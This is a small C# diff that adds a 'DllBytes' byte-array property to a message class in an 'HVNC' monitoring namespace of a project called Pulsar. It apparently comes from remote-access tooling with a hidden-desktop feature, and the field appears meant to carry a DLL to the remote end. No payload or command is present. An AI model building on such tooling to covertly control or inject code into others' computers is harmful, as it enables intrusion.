@@ -13,5 +13,7 @@ namespace Pulsar.Common.Messages.Monitoring.HVNC
         public string Arguments { get; set; }
         [Key(3)]
         public bool DontCloneProfile { get; set; }
+        [Key(4)]
+        public byte[] DllBytes { get; set; }
     }
 }
